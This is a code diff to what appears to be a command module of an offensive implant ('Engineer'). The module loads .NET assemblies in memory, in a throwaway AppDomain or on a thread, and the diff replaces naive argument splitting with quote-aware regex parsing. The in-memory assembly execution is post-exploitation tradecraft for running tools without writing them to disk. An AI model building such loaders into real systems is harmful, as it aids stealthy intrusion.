@@ -1,7 +1,9 @@
 ﻿using System;
+using System.Collections.Generic;
 using System.IO;
 using System.Reflection;
 using System.Text;
+using System.Text.RegularExpressions;
 using System.Threading;
 using System.Threading.Tasks;
 using DynamicEngLoading;
@@ -28,9 +30,7 @@ namespace Engineer.Commands
                 return;
             }
             task.Arguments.TryGetValue("/args", out string assemblyArgument);
-            assemblyArgument = assemblyArgument.TrimStart(' ');
-            assemblyArgument = assemblyArgument.TrimStart('\"');
-            assemblyArgument = assemblyArgument.TrimEnd('\"');
+            assemblyArgument = assemblyArgument.Trim(' ');
             string appDomainName = null;
             string execMethod = "";
             bool execGiven = task.Arguments.TryGetValue("/execmethod", out execMethod);
@@ -60,6 +60,15 @@ namespace Engineer.Commands
                 // debase64 encode assembly string into a byte array
                 byte[] assemblyBytes = task.File;
 
+                // Split the string based on spaces but not when inside quotes
+                string[] ParsedArgs = Regex.Split(assemblyArgument, @" (?=(?:[^""]*""[^""]*"")*[^""]*$)");
+
+                //check each arg for " and remove them
+                for (int i=0; i< ParsedArgs.Length; i++ )
+                {
+                    string arg = ParsedArgs[i];
+                    ParsedArgs[i] = arg.Replace("\"", "");
+                }
 
                 if (execMethod != null && execMethod.Equals("UnloadDomain",StringComparison.CurrentCultureIgnoreCase))
                 {
@@ -70,7 +79,7 @@ namespace Engineer.Commands
                     output += $"[+] creating app domain {appDomainName}\n"; 
                     var domain = AppDomain.CreateDomain(appDomainName, null, appDomainSetup);
                     var executor = (AssemblyExecutor)domain.CreateInstanceAndUnwrap(Assembly.GetExecutingAssembly().FullName, typeof(AssemblyExecutor).FullName);
-                    output += executor.Execute(assemblyBytes, assemblyArgument.Split(), task, appDomainName);
+                    output += executor.Execute(assemblyBytes, ParsedArgs, task, appDomainName);
                     output += "\n[*] trying to unload appdomain";
                     AppDomain.Unload(domain);
                     output += "\n[+] app domain unloaded";
@@ -90,7 +99,7 @@ namespace Engineer.Commands
                     {
                         //will block so needs its own thread
                         Assembly assembly = Assembly.Load(assemblyBytes);
-                        assembly.EntryPoint.Invoke(null, new[] { $"{assemblyArgument}".Split() });
+                        assembly.EntryPoint.Invoke(null, new[] { ParsedArgs });
                     });
 
                     //start the thread 
